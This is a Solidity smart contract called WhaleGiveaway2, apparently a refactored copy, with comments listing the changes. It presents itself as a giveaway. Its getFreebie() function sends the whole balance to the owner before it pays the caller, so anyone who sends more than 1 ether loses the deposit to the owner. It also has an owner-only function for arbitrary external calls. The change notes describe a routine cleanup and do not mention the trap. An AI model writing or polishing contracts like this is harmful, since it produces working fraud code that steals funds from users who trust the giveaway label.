pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public owner;

    function WhaleGiveaway2() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getFreebie() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }
} 

// Changes Made:
// 1. Renamed Owner to owner for consistency with Solidity naming conventions.
// 2. Added constructor function to set initial owner address.
// 3. Removed unnecessary address assignment in withdraw() function.
// 4. Added require statement to check for successful external call in Command() function.